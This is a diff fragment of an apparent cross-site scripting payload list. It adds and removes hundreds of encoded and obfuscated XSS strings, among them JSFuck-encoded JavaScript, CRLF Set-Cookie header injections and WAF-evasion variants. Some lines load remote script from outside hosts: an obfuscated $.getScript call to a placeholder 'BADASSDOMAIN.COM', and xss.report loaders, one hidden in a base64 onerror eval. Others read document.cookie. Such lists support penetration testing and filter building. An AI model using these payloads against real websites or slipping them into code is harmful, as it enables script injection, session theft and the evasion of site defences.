D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%29%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%2B%5B%5D%5D%2B%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29
+%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%28%5B%2B%5B%5D%5D%2B%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme 
+<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
+%3B%C3%81=![]%3B%C3%89=!![]%3B%C3%8D=[][[]]%3B%C3%93=%2B[![]]%3BSI=%2B(%2B!%2B[]%2B(!%2B[]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B[%2B!%2B[]]%2B[%2B[]]%2B[%2B[]]%2B[%2B[]])%3BST=([]%2B[])%3B%C3%9C=(%2B[])%3BA=(%C3%81%2B%22%22)[1]%3BD%20=%20(%C3%8D%2B%22%22)[2]%3BE%20=%20(%C3%89%2B%22%22)[3]%3BF%20=%20(%C3%81%2B%22%22)[0]%3BG%20=%20[![]%2B[%2B[]]%2B[[]%2B[]][%2B[]][[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B!%2B[]]%2B[![]%2B[]][%2B[]][!%2B[]%2B!%2B[]%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B[]]%2B[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]]][%2B[]][!%2B[]%2B!%2B[]%2B[%2B[]]]%3BI%20=%20([%C3%81]%2B%C3%8D)[10]%3BL%20=%20(%C3%81%2B%22%22)[2]%3BT%20=%20(%C3%89%2B%22%22)[0]%3BO%20=%20(%C3%89%2B[][F%2BI%2BL%2BL])[10]%3BR%20=%20(%C3%89%2B%22%22)[1]%3BN%20=%20(%C3%8D%2B%22%22)[1]%3BM%20=%20(%2B(208))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BP%20=%20(%2B(211))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BS%20=%20(%C3%81%2B%22%22)[3]%3BU%20=%20(%C3%8D%2B%22%22)[0]%3BV%20=%20(%2B(31))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](32)%3BX%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](34)[1]%3BY%20=%20(%C3%93%2B[SI])[10]%3BZ%20=%20(%2B(35))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](36)%3BC%20=%20([][F%2BI%2BL%2BL]%2B%22%22)[3]%3BH%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)[1]%3BK%20=%20(%2B(20))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)%3BW%20=%20(%2B(32))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](33)%3BJ%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%22%22)[3]%3BB%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%22%22)[2]%3BDOT%20=%20(%2B(%2211E100%22)%2B[])[1]%3BSLA=(![]%2B[%2B![]])[([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(!![]%2B[])[%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B([][(![]%2B[])[%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B(!![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B!%2B[]]]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]]()[%2B!%2B[]%2B[%2B[]]]%3B[][F%2BI%2BL%2BL][C%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR](S%2BE%2BT%2B%22T%22%2BI%2BM%2BE%2BO%2BU%2BT%2B%22(%22%2BF%2BU%2BN%2BC%2BT%2BI%2BO%2BN%2B%22()%7B%20$%22%2BDOT%2BG%2BE%2BT%2B%22S%22%2BC%2BR%2BI%2BP%2BT%2B%22('%22%2BSLA%2BSLA%2B%22BADASSDOMAIN%22%2BDOT%2B%22COM%22%2BSLA%2B%22BADASSURL')()%3B%20%7D,%203000)%3B%22)()%3B(%22
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<details open ontoggle="alert(1)"><summary>Click me!</summary></details>
+tagName%2BinnerHTML%2Blocation.hash%3E/*click%20me!#*/alert(document.domain)
+javascript://'/</title></style></textarea></script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript://%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B%27%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript://%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029XSS-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+<math><x xlink:href=javascript:confirm`1`>click
+%22%2525%2F%28%29%2C%20alert%281%29%3B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E%3Cscript%3E
+%3C%25%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
+%22%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
+%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
+%253C%2531%2533%2533%253E%253C%2539%253E%253C%2569%253D%2538%253B%253E%253C%253F%256A%2532%253E%253C%252F%2563%253E%253C%252F%2573%2563%2568%2572%2569%2570%2574%253E
+%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e
+%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<form><button formaction=javascript&colon;alert(1)>CLICKME
 &amp;amp;amp;lt;script&amp;amp;amp;gt;alert(1)&amp;amp;amp;lt;/script&amp;amp;amp;gt;
 &amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;
 &lt;img src=1 onerror=alert(1)&gt;
@@ -1432,8 +2396,6 @@ autofocus ' onfocus='alert(document.domain)'
 <html ontouchmove=alert(1)>
 <html ontouchcancel=alert(1)>
 <body onorientationchange=alert(1)>
-"><img src=1 onerror=alert(1)>.gif
-";a=prompt,a()//
 ';a=prompt,a()//
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
@@ -1448,7 +2410,6 @@ autofocus ' onfocus='alert(document.domain)'
 <img src =q onerror=prompt(8)>
 </scrip</script>t><img src =q onerror=prompt(8)>
 <svg onload=alert(1)>
-"><svg onload=alert(1)//
 "onmouseover=alert(1)//
 "autofocus/onfocus=alert(1)//
 '-alert(1)//
@@ -1480,11 +2441,9 @@ XSS"<s><a+href=//%26lt;svg/o%26%2378;load=alert(1)%26gt;>
 <!--%26gt;<TextArea><!--><Script>/*/</TextArea>/*/alert(1)</Script>
 <<https:http://x55.is/onfocus=1?import(tagName):1… AutoFocus ContentEditable>>
 <Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)//
-<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 <xss ontransitionend​="alert(document.domain)">
 <xss ontransitionstart​="alert(document.domain)">
 <xss ontransitionrun​="alert(document.domain)"> 
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <input%20type=hidden%20oncontentvisibilityautostatechange=alert()%20style=content-visibility:auto>
 </<K><Svg Onload=alert(1)>
 </<Kno XSS="><Svg Onload=alert(1)>
@@ -1500,7 +2459,6 @@ XSS"<s><a+href=//%26lt;svg/o%26%2378;load=alert(1)%26gt;>
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA AAABCAIAAADj8JvFAAAAEElEQVRIDbXBAQEAAAABIP6Pz3/vD0E1BYAAAAAElFTkSuQmCC"  onerror="alert('Hacked_by_momika233')"> 
 %3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(document.domain)%3C/scRipt%3E
 <<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
-<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 '"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
 '"><script src=https://xss.report/c/department></script>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
@@ -1518,11 +2476,9 @@ var a=document.createElement("script");a.src="https://xss.report/c/department";d
 OnXSS=<Img/Src/OnError=alert(1)>
 (1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
 <img src=x  oncontentvisibilityautostatechange="confirm(1)">
-<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 0</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload =prompt(document.cookie)%20>
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
 <img hrEF="0" sRC="data:0," oNLy=1 oNErrOR =console.log`1`>
-‘>alert(154)</script><script/154=’;;;;;;;
